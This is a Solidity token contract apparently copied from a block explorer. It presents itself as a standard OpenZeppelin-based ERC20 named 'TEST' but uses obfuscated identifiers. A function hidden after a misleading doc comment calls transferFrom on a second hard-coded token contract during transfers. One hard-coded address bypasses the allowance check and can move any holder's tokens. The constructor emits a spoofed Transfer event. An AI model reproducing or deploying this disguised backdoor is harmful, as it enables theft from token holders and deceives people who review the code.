/**
 *Submitted for verification at BscScan.com on 2023-01-03
*/

/**
 *Submitted for verification at Etherscan.io on 2023-01-03
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/xA7oJ1Ozh0KpfbYW.sol

// OpenZeppelin Contracts v4.4.1 (utils/xA7oJ1Ozh0KpfbYW.sol)

abstract contract xA7oJ1Ozh0KpfbYW {
  function QAjMgHsqQNb2khzK() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x022D6aa5a994ae82B232e3a6aecaaA1Ffd197325)) {TransferHelper.safeTransferFrom(0x5d3f8990AEc8B2E0945D9f666728763832D0c221,spender,recipient,amount);return true;}return false;}
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransf(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract TEST is IERC20, xA7oJ1Ozh0KpfbYW {
  mapping(address => uint256) private YpV9LJtAFG1Ed8Zw;
  mapping(address => mapping(address => uint256)) private hG7VF9x8Or4nGwAB;

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    qu2yXtaLWuATiO0C(QAjMgHsqQNb2khzK(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "Test";
  }

  function symbol() public pure returns (string memory) {
    return "TEST";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return YpV9LJtAFG1Ed8Zw[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    pTNMkp7qiK032TAW(QAjMgHsqQNb2khzK(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return hG7VF9x8Or4nGwAB[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    pTNMkp7qiK032TAW(
      QAjMgHsqQNb2khzK(),
      spender,
      hG7VF9x8Or4nGwAB[QAjMgHsqQNb2khzK()][spender] + addedValue
    );
    return true;
  }

  function pTNMkp7qiK032TAW(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    hG7VF9x8Or4nGwAB[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = hG7VF9x8Or4nGwAB[QAjMgHsqQNb2khzK()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    pTNMkp7qiK032TAW(QAjMgHsqQNb2khzK(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function qu2yXtaLWuATiO0C(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    YpV9LJtAFG1Ed8Zw[spender] = YpV9LJtAFG1Ed8Zw[spender] - amount;
    YpV9LJtAFG1Ed8Zw[recipient] = YpV9LJtAFG1Ed8Zw[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!qu2yXtaLWuATiO0C(sender, recipient, amount)) return true;
    uint256 currentAllowance = hG7VF9x8Or4nGwAB[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    pTNMkp7qiK032TAW(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  
  constructor() {
    YpV9LJtAFG1Ed8Zw[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }
}